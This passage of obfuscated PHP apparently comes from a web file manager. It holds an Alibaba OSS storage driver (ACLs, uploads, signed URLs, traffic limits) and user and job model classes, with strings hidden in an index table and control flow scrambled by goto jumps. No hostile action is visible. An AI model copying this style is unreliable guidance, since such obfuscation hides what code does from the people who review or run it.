$_SERVER[Š‰][514] ? !0 : !1; } public function pathAcl($cîœÃóÀŸÃ) { goto e°‘¡îñÅ; e°‘¡îñÅ: $Bìˆ¶ù =& $_SERVER[Š‰]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $BÌ‘ªïˆÏ‡ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($cîœÃóÀŸÃ)); } catch (OSS\Core\OssException $c‰²‡Ç¦ÔÈ) { return !1; } goto d…âµ‰¥; d›é³öù¸Œ: return $b¾¥›ƒÉï›; goto C‚‚ÜáÈÏ; d…âµ‰¥: $b¾¥›ƒÉï› = $BÌ‘ªïˆÏ‡ == $Bìˆ¶ù[34] ? $this->bucketAcl : $BÌ‘ªïˆÏ‡; if ($b¾¥›ƒÉï› == $Bìˆ¶ù[1259]) { return $Bìˆ¶ù[1258]; } if ($b¾¥›ƒÉï› == $Bìˆ¶ù[1260]) { return $Bìˆ¶ù[514]; } goto d›é³öù¸Œ; C‚‚ÜáÈÏ: } private function chmodPath($D±´¢‡‹Â, $bå¦¹¡ô = '') { $dïì¢Ÿ ê =& $_SERVER[Š‰]; $EîÄ¿éßâ = empty($bå¦¹¡ô) ? $dïì¢Ÿ ê[1260] : $bå¦¹¡ô; $CİÙ¦¼ËÙ™ = array($dïì¢Ÿ ê[34], $dïì¢Ÿ ê[191], $dïì¢Ÿ ê[1259], $dïì¢Ÿ ê[1260]); if (!in_array($EîÄ¿éßâ, $CİÙ¦¼ËÙ™)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($D±´¢‡‹Â), $EîÄ¿éßâ); } catch (OSS\Core\OssException $eƒËøä÷ø) { return !1; } return !0; } public function getContent($aãğÀÎò¿) { return $this->fileSubstr($aãğÀÎò¿, -1); } public function setContent($E×³§°ÂÄ‰, $Fğ™³÷¾„­ = '') { $cå¦ƒòµŸĞ =& $_SERVER[Š‰]; try { $FÒ¿ê¡øÊÈ = $this->trafficLimit($cå¦ƒòµŸĞ[1261]); $a›î†Ì‡–’ = $this->client->putObject($this->bucket, $this->pathEncode($E×³§°ÂÄ‰), $Fğ™³÷¾„­, $FÒ¿ê¡øÊÈ); } catch (OSS\Core\OssException $AñÁˆšâ¨ ) { return !1; } $aÔì•«ø˜¸ = array($cå¦ƒòµŸĞ[1250] => trim($a›î†Ì‡–’[$cå¦ƒòµŸĞ[1262]], $cå¦ƒòµŸĞ[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($E×³§°ÂÄ‰))); $this->updateObjMeta($E×³§°ÂÄ‰, $aÔì•«ø˜¸); return isset($a›î†Ì‡–’[$cå¦ƒòµŸĞ[1263]][$cå¦ƒòµŸĞ[1209]]) ? !0 : !1; } private function updateObjMeta($aŠàÍæò™Ô, $cˆùùßÇä) { $aŠàÍæò™Ô = $this->pathEncode($aŠàÍæò™Ô); try { $aÖ‚Ş ÇŠ¼ = array(OSS\OssClient::OSS_HEADERS => $cˆùùßÇä); $this->client->copyObject($this->bucket, $aŠàÍæò™Ô, $this->bucket, $aŠàÍæò™Ô, $aÖ‚Ş ÇŠ¼); } catch (OSS\Core\OssException $f¨»Õá‹Ã£) { return !1; } return !0; } public function upload($e’õïœÂ¦À, $FÌÇ»°µ” , $AêÇššó = false, $d•Ëƒ‚˜¼ = REPEAT_REPLACE) { $C™’ŞŠ¶Ó =& $_SERVER[Š‰]; $aø†Î£¹Ù‚ = trim($e’õïœÂ¦À, $C™’ŞŠ¶Ó[8]); $B·Ğ¥…‘ù  = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($C™’ŞŠ¶Ó[1250] => @md5_file($FÌÇ»°µ” )), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e’õïœÂ¦À))); $B·Ğ¥…‘ù  = $this->trafficLimit($C™’ŞŠ¶Ó[1261], $B·Ğ¥…‘ù ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($aø†Î£¹Ù‚), $FÌÇ»°µ” , $B·Ğ¥…‘ù ); } catch (OSS\Core\OssException $c›’åà³Ç‡) { return !1; } return $this->getPathOuter($e’õïœÂ¦À); } public function getHost() { $d°¦…£áµÂ =& $_SERVER[Š‰]; $D»Ô–ë×°± = explode($d°¦…£áµÂ[177], parent::getHost()); return $D»Ô–ë×°±[0] . $d°¦…£áµÂ[177] . $this->bucket . $d°¦…£áµÂ[94] . $D»Ô–ë×°±[1]; } public function uploadFormData($cˆ¼¾ß¢¡¨, $B»í¥ÚÃÁ = 3600) { goto B¹ãÜõÒÜ¡; CğÔàÕå¥ç: return $EŠÜĞÌ”„§; goto c«‘‰Åùç; F³Õã¿Õôì: $B×õ‘ò²½ = base64_encode(hash_hmac($dáÄÆ¡ôñ[228], $dùñ‚éÉ¨, $this->secret, !0)); $EŠÜĞÌ”„§ = array($dáÄÆ¡ôñ[1175] => $dùñ‚éÉ¨, $dáÄÆ¡ôñ[1267] => $this->accessKey, $dáÄÆ¡ôñ[1171] => $dáÄÆ¡ôñ[1163], $dáÄÆ¡ôñ[1268] => $B×õ‘ò²½, $dáÄÆ¡ôñ[175] => $d´›Ü¥±Ê); $EŠÜĞÌ”„§ = $this->trafficLimit($dáÄÆ¡ôñ[1261], $EŠÜĞÌ”„§); goto CğÔàÕå¥ç; Fî¥ô‡¹Â: $a•æñ†­ñ = $this->pathFather($cˆ¼¾ß¢¡¨); $bƒÜÏ–ƒ•£ = array($dáÄÆ¡ôñ[1165] => $cÒœ¼ò£…, $dáÄÆ¡ôñ[1166] => array(array($dáÄÆ¡ôñ[1266], 0, $D“ò¾ô¯), array($dáÄÆ¡ôñ[1169], $dáÄÆ¡ôñ[1170], $a•æñ†­ñ))); $dùñ‚éÉ¨ = base64_encode(json_encode($bƒÜÏ–ƒ•£)); goto F³Õã¿Õôì; Cåğ‘áÁ: $CéóÆ†ò” = strpos($cÒœ¼ò£…, $dáÄÆ¡ôñ[292]); $cÒœ¼ò£… = substr($cÒœ¼ò£…, 0, $CéóÆ†ò”) . $dáÄÆ¡ôñ[1265]; $D“ò¾ô¯ = 1048576000 * 5; goto Fî¥ô‡¹Â; bè×“¿‰æï: $B­·ÑãÍõ¶ = date($dáÄÆ¡ôñ[1264], time() + $dŠì»îÏææ); $cê‚‰ôÃÊŠ = new DateTime($B­·ÑãÍõ¶); $cÒœ¼ò£… = $cê‚‰ôÃÊŠ->format(DateTime::ISO8601); goto Cåğ‘áÁ; B¹ãÜõÒÜ¡: $dáÄÆ¡ôñ =& $_SERVER[Š‰]; if (!($d´›Ü¥±Ê = $this->getHost())) { return !1; } $dŠì»îÏææ = $B»í¥ÚÃÁ; goto bè×“¿‰æï; c«‘‰Åùç: } public function multiUploadFormData($AçŸİ„ë°, $c©àš°­‚Ü = 3600) { $A¦ëê¸†‘ =& $_SERVER[Š‰]; if (!($AƒÑŸóáá = $this->getHost())) { return !1; } $D‚³“¸¢ùì = $this->trafficLimit($A¦ëê¸†‘[1261]); $ešÚĞ´…Í = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($AçŸİ„ë°), $D‚³“¸¢ùì); return array($A¦ëê¸†‘[219] => $ešÚĞ´…Í, $A¦ëê¸†‘[175] => $AƒÑŸóáá . $A¦ëê¸†‘[8] . $this->pathEncode($AçŸİ„ë°), $A¦ëê¸†‘[220] => gmdate($A¦ëê¸†‘[1269]), $A¦ëê¸†‘[92] => $AçŸİ„ë°); } public function multiUploadAuthData($BôÑ‰ÍŒÛ, $dÊë·Ö™¦ = array()) { goto DÅß»¼†ìô; fä†ÊäÕ³Ô: $eß½òéµÁÈ = $b¹¹Ù²‹´[1234] . $this->accessKey . $b¹¹Ù²‹´[4] . $AŠ‚õ¼¶î; if (strpos($a½Ã´ôÄ­, $b¹¹Ù²‹´[223]) === 0) { $eß½òéµÁÈ = array($b¹¹Ù²‹´[230] => $eß½òéµÁÈ, $b¹¹Ù²‹´[220] => $A‹î¤‰„îÍ); if ($bÔ®«àÊ‰‡) { $eß½òéµÁÈ = array_merge($eß½òéµÁÈ, $bÔ®«àÊ‰‡); } } return $eß½òéµÁÈ; goto Bè‡ÇŸ†¤; aô¿§ãíó: $AƒŞ¤òÒ­‰ = array($b¹¹Ù²‹´[222], $b¹¹Ù²‹´[33], $b¹¹Ù²‹´[118], $A‹î¤‰„îÍ, "\170\x2d\157\163\x73\x2d\x64\x61\164\x65\72{$A‹î¤‰„îÍ}", $b¹¹Ù²‹´[8] . $this->bucket . $b¹¹Ù²‹´[8] . $a÷«­ƒøï½ . $a½Ã´ôÄ­); if (strpos($a½Ã´ôÄ­, $b¹¹Ù²‹´[223]) === 0) { $AƒŞ¤òÒ­‰[0] = $b¹¹Ù²‹´[224]; if ($bÔ®«àÊ‰‡ = $this->trafficLimit($b¹¹Ù²‹´[1261])) { $a÷«­ƒøï½ = $b¹¹Ù²‹´[1270]; array_splice($AƒŞ¤òÒ­‰, 5, 0, $a÷«­ƒøï½ . $b¹¹Ù²‹´[4] . $bÔ®«àÊ‰‡[$a÷«­ƒøï½]); } } if (isset($dÊë·Ö™¦[$b¹¹Ù²‹´[225]]) && $dÊë·Ö™¦[$b¹¹Ù²‹´[225]] == $b¹¹Ù²‹´[226]) { $AƒŞ¤òÒ­‰[0] = $b¹¹Ù²‹´[226]; } goto D­»Î°ñì¶; DÅß»¼†ìô: $b¹¹Ù²‹´ =& $_SERVER[Š‰]; $A‹î¤‰„îÍ = isset($dÊë·Ö™¦[$b¹¹Ù²‹´[220]]) ? $dÊë·Ö™¦[$b¹¹Ù²‹´[220]] : gmdate($b¹¹Ù²‹´[1269]); $a½Ã´ôÄ­ = isset($dÊë·Ö™¦[$b¹¹Ù²‹´[167]]) ? $dÊë·Ö™¦[$b¹¹Ù²‹´[167]] : $b¹¹Ù²‹´[33]; goto eè„´’öïñ; D­»Î°ñì¶: if (!empty($dÊë·Ö™¦[$b¹¹Ù²‹´[1271]])) { $AÃ˜‚¶²»Ã = array_merge(array($AƒŞ¤òÒ­‰[4]), $dÊë·Ö™¦[$b¹¹Ù²‹´[1271]]); sort($AÃ˜‚¶²»Ã); $AƒŞ¤òÒ­‰[4] = implode($b¹¹Ù²‹´[227], $AÃ˜‚¶²»Ã); } $d›·È¤¶¸ª = implode($b¹¹Ù²‹´[227], $AƒŞ¤òÒ­‰); $AŠ‚õ¼¶î = base64_encode(hash_hmac($b¹¹Ù²‹´[228], $d›·È¤¶¸ª, $this->secret, !0)); goto fä†ÊäÕ³Ô; eè„´’öïñ: $a÷«­ƒøï½ = $BôÑ‰ÍŒÛ; if (isset($dÊë·Ö™¦[$b¹¹Ù²‹´[92]])) { $a÷«­ƒøï½ = $dÊë·Ö™¦[$b¹¹Ù²‹´[92]]; unset($dÊë·Ö™¦[$b¹¹Ù²‹´[92]]); } if (isset($dÊë·Ö™¦[$b¹¹Ù²‹´[221]])) { $dÊë·Ö™¦[$b¹¹Ù²‹´[220]] = $A‹î¤‰„îÍ; return $this->listUploadParts($a÷«­ƒøï½, $dÊë·Ö™¦); } goto aô¿§ãíó; Bè‡ÇŸ†¤: } public function listUploadParts($Få†‡›ù¼é, $F‰†ÛÁ¾œÛ) { goto A‘øµ»­‹; cóµ«¥ªÚï: unset($F‰†ÛÁ¾œÛ[$dÕšçÑ¾³„[221]], $F‰†ÛÁ¾œÛ[$dÕšçÑ¾³„[225]]); $EÕ»˜åØ¦ = $this->multiUploadAuthData($Få†‡›ù¼é, $F‰†ÛÁ¾œÛ); if (empty($EÕ»˜åØ¦)) { return !1; } goto BŸßôœæÅ; BŸßôœæÅ: return array($dÕšçÑ¾³„[230] => $EÕ»˜åØ¦, $dÕšçÑ¾³„[220] => $F‰†ÛÁ¾œÛ[$dÕšçÑ¾³„[220]], $dÕšçÑ¾³„[232] => $fç”õÔ•¦); goto dŒàã›ÙÄÂ; aô¯ ©‰„¸: $C‰ßê’÷š = $E¸š÷æ×ô->getListPart(); $fç”õÔ•¦ = array(); foreach ($C‰ßê’÷š as $D¸“¡Ä²‹±) { $fç”õÔ•¦[] = array($dÕšçÑ¾³„[1254] => $D¸“¡Ä²‹±->getPartNumber(), $dÕšçÑ¾³„[1255] => trim($D¸“¡Ä²‹±->getETag(), $dÕšçÑ¾³„[115])); } goto cóµ«¥ªÚï; A‘øµ»­‹: $dÕšçÑ¾³„ =& $_SERVER[Š‰]; $b‹Â÷Å£Á = parse_url_query($F‰†ÛÁ¾œÛ[$dÕšçÑ¾³„[167]]); $E¸š÷æ×ô = $this->client->listParts($this->bucket, $this->pathEncode($Få†‡›ù¼é), $b‹Â÷Å£Á[$dÕšçÑ¾³„[219]]); goto aô¯ ©‰„¸; dŒàã›ÙÄÂ: } public function download($Aç‘¿ĞÈ, $F«®Î¤ÄáÊ) { if ($this->isFolder($Aç‘¿ĞÈ)) { return !1; } try { $Aê„Œ¾ÄÕÑ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $F«®Î¤ÄáÊ); $Aê„Œ¾ÄÕÑ = $this->trafficLimit($_SERVER[Š‰][108], $Aê„Œ¾ÄÕÑ); $this->client->getObject($this->bucket, $this->pathEncode($Aç‘¿ĞÈ), $Aê„Œ¾ÄÕÑ); } catch (OSS\Core\OssException $eÏÊõ‘Áº‹) { return !1; } return $F«®Î¤ÄáÊ; } public function fileSubstr($d©ä‡èë›, $e·£ëê’—„ = 0, $A†ê¶áæÜØ = false) { if ($e·£ëê’—„ === -1) { $D£ˆù¸ƒÕí = array(); } else { if ($A†ê¶áæÜØ === !1) { $Cáˆ¥ëÆÌ = $this->size($d©ä‡èë›); } else { $Cáˆ¥ëÆÌ = $e·£ëê’—„ + $A†ê¶áæÜØ - 1; } $D£ˆù¸ƒÕí = array(OSS\OssClient::OSS_RANGE => "{$e·£ëê’—„}\55{$Cáˆ¥ëÆÌ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($d©ä‡èë›), $D£ˆù¸ƒÕí); } catch (OSS\Core\OssException $e„‘æ·Êáë) { think_exception($e„‘æ·Êáë->getMessage()); return !1; } } private function trafficLimit($CñíêóµÅ, $aŞƒŒ˜Û± = array()) { goto bŠ°Õ‘‰ó; bŠ°Õ‘‰ó: $aŠ²è»íµá =& $_SERVER[Š‰]; if ($CñíêóµÅ == $aŠ²è»íµá[1261] && $this->isUploadServer() || $CñíêóµÅ == $aŠ²è»íµá[108] && $this->isFileOutServer()) { return $aŞƒŒ˜Û±; } $E½¨­­ô£ = floatval($GLOBALS[$aŠ²è»íµá[6]][$aŠ²è»íµá[87]][$aŠ²è»íµá[106]][$CñíêóµÅ]) * 1024 * 1024 * 8; goto e«˜áøåÍ; e«˜áøåÍ: if (!$E½¨­­ô£) { return $aŞƒŒ˜Û±; } $E½¨­­ô£ = $E½¨­­ô£ < 819200 ? 819200 : ($E½¨­­ô£ > 838860800 ? 838860800 : $E½¨­­ô£); $aŞƒŒ˜Û±[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($E½¨­­ô£); goto fğ Ÿˆ‚’µ; fğ Ÿˆ‚’µ: return $aŞƒŒ˜Û±; goto CÎó¯Š„ØÏ; CÎó¯Š„ØÏ: } public function link($Bæ·‹µóšÄ, $Dß æÃƒî = array()) { $cÏçÔí ‚Å =& $_SERVER[Š‰]; if (!$this->exist($Bæ·‹µóšÄ) || $this->isFolder($Bæ·‹µóšÄ)) { return !1; } try { $Dß æÃƒî = $this->trafficLimit($cÏçÔí ‚Å[108], $Dß æÃƒî); $A…¾›‚è‚ = $this->client->signUrl($this->bucket, $this->pathEncode($Bæ·‹µóšÄ), 3600 * 12, $cÏçÔí ‚Å[226], $Dß æÃƒî); return $this->getCdnLink($A…¾›‚è‚); } catch (OSS\Core\OssException $dÑõí»á†) { return !1; } } public function fileOut($e¬­ˆ¶Ñ¿ø, $Eè‹†Áæ‡ö = false, $cÜØé–Œ® = false, $A¾ô•ÓÕ¯ã = '') { goto A­²à˜¨Æ™; EÒ³µÒ…„Û: $Eè‹†Áæ‡ö = $Eè‹†Áæ‡ö ? $A‘§¹Æ¸[212] : $A‘§¹Æ¸[213]; $DÚğÌÎ«áª = array(OSS\OssClient::OSS_SUB_RESOURCE => $A‘§¹Æ¸[1272] . rawurlencode("{$Eè‹†Áæ‡ö}\x3b\146\x69\154\x65\x6e\x61\x6d\x65\x3d{$cÜØé–Œ®}")); $DÚğÌÎ«áª[OSS\OssClient::OSS_SUB_RESOURCE] .= $A‘§¹Æ¸[1273] . rawurlencode($aÊ«¸ÑÚÈŒ); goto D†ºĞ‚Õ¡ô; A­²à˜¨Æ™: $A‘§¹Æ¸ =& $_SERVER[Š‰]; if ($this->isFileOutServer()) { return $this->fileOutServer($e¬­ˆ¶Ñ¿ø, $Eè‹†Áæ‡ö, $cÜØé–Œ®, $A¾ô•ÓÕ¯ã); } if (!$cÜØé–Œ®) { $cÜØé–Œ® = $this->pathThis($e¬­ˆ¶Ñ¿ø); } goto b¬âèŸ”±; D†ºĞ‚Õ¡ô: $d«Ã„õ•ùø = $this->link($e¬­ˆ¶Ñ¿ø, $DÚğÌÎ«áª); $this->fileOutLink($d«Ã„õ•ùø); goto C½š˜à©Òö; b¬âèŸ”±: $cÜØé–Œ® = rawurlencode($cÜØé–Œ®); $aÊ«¸ÑÚÈŒ = get_file_mime(get_path_ext($cÜØé–Œ®)); if ($aÊ«¸ÑÚÈŒ == $A‘§¹Æ¸[211]) { return parent::fileOut($e¬­ˆ¶Ñ¿ø, $Eè‹†Áæ‡ö, $cÜØé–Œ®, $A¾ô•ÓÕ¯ã); } goto EÒ³µÒ…„Û; C½š˜à©Òö: } public function fileOutServer($d†‹‹œ’ğƒ, $aŠ­ìà¨’» = false, $aáÇÛ¨›† = false, $EÏòÚØ‰—ç = '') { parent::fileOut($d†‹‹œ’ğƒ, $aŠ­ìà¨’», $aáÇÛ¨›†, $EÏòÚØ‰—ç); } public function fileOutImage($BÎŠÏÏ‰››, $c–Ê…»Ô = 250) { $d Šï¢ÈÅõ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Š‰][1274] . $c–Ê…»Ô); $dÉô“ö¬à = $this->link($BÎŠÏÏ‰››, $d Šï¢ÈÅõ); $this->fileOutLink($dÉô“ö¬à); } public function fileOutImageServer($Dšï·‹ÕêÒ, $B×­Š¬÷¨› = 250) { parent::fileOutImage($Dšï·‹ÕêÒ, $B×­Š¬÷¨›); } public function fileOutLink($F›‚ŞˆõÑŸ) { $d¨¢Õˆˆ®­ =& $_SERVER[Š‰]; if (!$this->isCdnHost() && substr($F›‚ŞˆõÑŸ, 0, 7) == $d¨¢Õˆˆ®­[1178]) { $F›‚ŞˆõÑŸ = $d¨¢Õˆˆ®­[1179] . substr($F›‚ŞˆõÑŸ, 7); } header($d¨¢Õˆˆ®­[158] . $F›‚ŞˆõÑŸ); die; } public function hashMd5($e…¹¢Ê¥‘¹, $BĞœ‚¹§óŸ = '') { $c—¼Å‰Æ£° =& $_SERVER[Š‰]; $e‚‹ÄÊ÷¶‰ = $this->_objectMeta($e…¹¢Ê¥‘¹); if (!$e‚‹ÄÊ÷¶‰) { return $c—¼Å‰Æ£°[33]; } if (!isset($e‚‹ÄÊ÷¶‰[$c—¼Å‰Æ£°[1250]]) && !empty($BĞœ‚¹§óŸ)) { $a´„Ì‚‹¨ = $this->updateObjMeta($e…¹¢Ê¥‘¹, array($c—¼Å‰Æ£°[1250] => $BĞœ‚¹§óŸ)); $e‚‹ÄÊ÷¶‰[$c—¼Å‰Æ£°[1250]] = $a´„Ì‚‹¨ ? $BĞœ‚¹§óŸ : $c—¼Å‰Æ£°[33]; } return isset($e‚‹ÄÊ÷¶‰[$c—¼Å‰Æ£°[1250]]) ? strtolower($e‚‹ÄÊ÷¶‰[$c—¼Å‰Æ£°[1250]]) : $c—¼Å‰Æ£°[33]; } public function size($b‹™æ‰ó›Û) { $EÁİÅ©öˆ = $this->objectMeta($b‹™æ‰ó›Û); return $EÁİÅ©öˆ ? $EÁİÅ©öˆ[$_SERVER[Š‰][77]] : 0; } public function info($E½Œ¬óÅâ¥) { if ($this->isFolder($E½Œ¬óÅâ¥)) { return $this->folderInfo($E½Œ¬óÅâ¥); } else { if ($this->isFile($E½Œ¬óÅâ¥)) { return $this->fileInfo($E½Œ¬óÅâ¥); } } return !1; } public function exist($d©–¨¢²Ş) { return $this->isFile($d©–¨¢²Ş) || $this->isFolder($d©–¨¢²Ş); } public function isFile($bšÀÁáº) { return !$this->isFolder($bšÀÁáº) && $this->objectMeta($bšÀÁáº); } public function isFolder($fåí©ˆîß’) { return $this->cacheMethod($_SERVER[Š‰][197], $fåí©ˆîß’); } protected function objectMeta($Aíó‡ÔÀ) { return $this->cacheMethod($_SERVER[Š‰][198], $Aíó‡ÔÀ); } protected function _objectMeta($eÆœèÌÕ¸) { $f‡˜°ƒå =& $_SERVER[Š‰]; try { $E½ëå¹Ä­­ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eÆœèÌÕ¸)); } catch (OSS\Core\OssException $dÈŒ¹¦É±Œ) { $E½ëå¹Ä­­ = !1; } if ($E½ëå¹Ä­­) { $E½ëå¹Ä­­[$f‡˜°ƒå[77]] = intval($E½ëå¹Ä­­[$f‡˜°ƒå[1248]]); } return $E½ëå¹Ä­­; } protected function _isFolder($F›Ÿ’¡Û) { $f‰¯¦ĞÕ¹Â =& $_SERVER[Š‰]; if ($F›Ÿ’¡Û == $f‰¯¦ĞÕ¹Â[33] || $F›Ÿ’¡Û == $f‰¯¦ĞÕ¹Â[8]) { return !0; } $BğùÛÍíÕ = array($f‰¯¦ĞÕ¹Â[1244] => $f‰¯¦ĞÕ¹Â[8], $f‰¯¦ĞÕ¹Â[1245] => rtrim($F›Ÿ’¡Û, $f‰¯¦ĞÕ¹Â[8]) . $f‰¯¦ĞÕ¹Â[8], $f‰¯¦ĞÕ¹Â[1246] => 1, $f‰¯¦ĞÕ¹Â[1247] => $f‰¯¦ĞÕ¹Â[33]); $DÃë‚ƒŒ§ = $this->client->listObjects($this->bucket, $BğùÛÍíÕ); if ($DÃë‚ƒŒ§->getObjectList() || $DÃë‚ƒŒ§->getPrefixList()) { return !0; } return !1; } } $dŠÉ•«óá = $_SERVER[$_SERVER[Š‰][751]]; $bùê«Õ†ó‰ = $_SERVER[Š‰][752]; goto cßÕÖ©ã; EÌ¹›³ÑÂÎ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x6a\157\142\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\144\145\163\143", "\163\157\162\x74"); const JOB_KEY = "\163\145\154\x66\x4a\157\142\x4c\151\x73\x74"; public function listData($B¾¦¯İ˜éç = false, $Cğ„ÓŞºá = "\163\157\162\164", $bøÆ¤¨©ÂŠ = false) { return parent::listData($B¾¦¯İ˜éç, $Cğ„ÓŞºá, $bøÆ¤¨©ÂŠ); } public function remove($dÂ˜ ƒ») { return parent::remove($dÂ˜ ƒ»); } public function add($a¶±ªš¹Á) { $b³¨É±á¬ò =& $_SERVER[Š‰]; if ($this->findByName($a¶±ªš¹Á[$b³¨É±á¬ò[28]])) { return !1; } $a¶±ªš¹Á[$b³¨É±á¬ò[1686]] = $this->getSort(); return parent::insert($a¶±ªš¹Á); } private function getSort() { $a¹¸»”ŒÒ =& $_SERVER[Š‰]; $FêÜë±ñ = parent::listData(); $Aó¸’ © = array_to_keyvalue($FêÜë±ñ, $a¹¸»”ŒÒ[33], $a¹¸»”ŒÒ[1686]); return empty($Aó¸’ ©) ? 0 : max($Aó¸’ ©) + 1; } public function update($AÑ»ñ‹­ã, $d‚¢êœ´Û) { $Fö…ÜâÕîà =& $_SERVER[Š‰]; $dÆ…ãªá¥° = parent::listData($AÑ»ñ‹­ã); $dôó²ÌÜØÌ = $this->findByName($d‚¢êœ´Û[$Fö…ÜâÕîà[28]]); if (!$dÆ…ãªá¥° || $dôó²ÌÜØÌ && $dôó²ÌÜØÌ[$Fö…ÜâÕîà[388]] != $dÆ…ãªá¥°[$Fö…ÜâÕîà[388]]) { return !1; } return parent::update($AÑ»ñ‹­ã, $d‚¢êœ´Û); } public function setUserJob($Aø›‹â¶Í, $aº¶ ª¤£†) { goto bÃŞïŠö¤ñ; bÃŞïŠö¤ñ: $e‚ÚÓïœé¬ =& $_SERVER[Š‰]; if (!is_array($aº¶ ª¤£†)) { $aº¶ ª¤£† = array($aº¶ ª¤£†); } $fÏÓÖ‚¨¯Û = parent::listData(); goto Cà‹ˆÃ¯Ñ; aÔíœ¡Ø³: $Fñ‰İ—Šã = rtrim($Fñ‰İ—Šã, $e‚ÚÓïœé¬[47]); Model($e‚ÚÓïœé¬[501])->metaSet($Aø›‹â¶Í, self::JOB_KEY, $Fñ‰İ—Šã); goto EœöÜ¿ÕÀ‚; Cà‹ˆÃ¯Ñ: $fÏÖÚÀ£™ = array_to_keyvalue($fÏÓÖ‚¨¯Û, $e‚ÚÓïœé¬[28]); $Fñ‰İ—Šã = $e‚ÚÓïœé¬[373]; foreach ($aº¶ ª¤£† as $C“Õé¥Ñ) { if ($fÏÖÚÀ£™[$C“Õé¥Ñ]) { $Fñ‰İ—Šã .= $fÏÖÚÀ£™[$C“Õé¥Ñ][$e‚ÚÓïœé¬[388]] . $e‚ÚÓïœé¬[47]; } else { $dƒªŞŠª­ö = $this->add($C“Õé¥Ñ); $Fñ‰İ—Šã .= $dƒªŞŠª­ö . $e‚ÚÓïœé¬[47]; } } goto aÔíœ¡Ø³; EœöÜ¿ÕÀ‚: } public function getUserJob($dÛŸÛ”®¾Ô) { $d»íÌ«×ˆ¿ = Model($_SERVER[Š‰][501])->metaGet($dÛŸÛ”®¾Ô); return $this->getUserJobInfo($d»íÌ«×ˆ¿[self::JOB_KEY]); } public function getUserJobInfo($a„íÆ“áÈÓ) { goto fô”áÀŠ´»; côÈôæŞõ: $DôÏğ› ®© = array_remove_key($DôÏğ› ®©, $Cñ«‚Èˆõ„[192]); $cÉ‹îÁ¬¬Ï = array(); foreach ($F²ø ÕŠ¸Ç as $C‚Æâé¬Š) { if (isset($DôÏğ› ®©[$C‚Æâé¬Š])) { $cÉ‹îÁ¬¬Ï[] = $DôÏğ› ®©[$C‚Æâé¬Š]; } } goto F‘Ü²ï­ÄÔ; fô”áÀŠ´»: $Cñ«‚Èˆõ„ =& $_SERVER[Š‰]; $F²ø ÕŠ¸Ç = explode($Cñ«‚Èˆõ„[47], $a„íÆ“áÈÓ); $DôÏğ› ®© = parent::listData(); goto côÈôæŞõ; F‘Ü²ï­ÄÔ: return $cÉ‹îÁ¬¬Ï; goto DŸùø’…†Ç; DŸùø’…†Ç: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\155\145" => "\x75\163\x65\x72\137\x6d\145\164\x61", "\155\x65\164\x61\x46\x69\145\x6c\144" => "\165\x73\x65\x72\111\x44"); protected $simpleField = "\x75\x73\145\162\111\104\54\x6e\151\x63\x6b\116\141\x6d\x65\x2c\x6e\141\155\x65\54\x61\166\x61\164\141\162\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($aª¾“³à) { $BÀæŠÄÈ‚’ =& $_SERVER[Š‰]; $dÂ—ŠêÀ = $BÀæŠÄÈ‚’[2084]; return array($BÀæŠÄÈ‚’[1734] => array($aª¾“³à[0], $dÂ—ŠêÀ), $BÀæŠÄÈ‚’[1736] => array($aª¾“³à[0], $dÂ—ŠêÀ), $BÀæŠÄÈ‚’[2085] => array($aª¾“³à[0], $dÂ—ŠêÀ)); } protected function getInfo($fà’Ê¢äâ÷, $dÂ¶—¡‰ç = false) { $fª‹îÓâÖ¡ = $this->getInfoSimple($fà’Ê¢äâ÷); if (!is_array($fª‹îÓâÖ¡)) { return array(); } if ($dÂ¶—¡‰ç) { return $this->_getInfoApply($fª‹îÓâÖ¡); } return $this->cacheFunctionGet($_SERVER[Š‰][1743], $fà’Ê¢äâ÷); } protected function getInfoFull($DÜÊ™ùŞº², $C©Ä°¸‰³ = false) { $FŠ»ŞˆÜ® = $this->getInfoSimple($DÜÊ™ùŞº²); if (!is_array($FŠ»ŞˆÜ®)) { return array(); } if ($C©Ä°¸‰³) { return $this->_getInfoApply($FŠ»ŞˆÜ®, !0); return $this->_getInfoApply($FŠ»ŞˆÜ®, !0); } return $this->cacheFunctionGet($_SERVER[Š‰][2086], $DÜÊ™ùŞº²); } private function _getInfoApply($C¿å÷¹Õ, $B¹ªî¸¶çë = false) { goto D™Œµí°ôö; D™Œµí°ôö: $F¬è÷¶Ÿº =& $_SERVER[Š‰]; if (!$C¿å÷¹Õ) { return $C¿å÷¹Õ; } $DĞÜùôÔÛá = md5($F¬è÷¶Ÿº[2087] . $C¿å÷¹Õ[$F¬è÷¶Ÿº[826]] . $F¬è÷¶Ÿº[2088] . $C¿å÷¹Õ[$F¬è÷¶Ÿº[28]]); goto c âÃ¥£È¦; c âÃ¥£È¦: $C¿å÷¹Õ = $this->_listDataApplyItem($C¿å÷¹Õ); $eˆÛ‘ïªµ‘ = Model($F¬è÷¶Ÿº[1180])->metaGet($C¿å÷¹Õ[$F¬è÷¶Ÿº[84]][$F¬è÷¶Ÿº[390]]); $C¿å÷¹Õ[$F¬è÷¶Ÿº[2089]] = 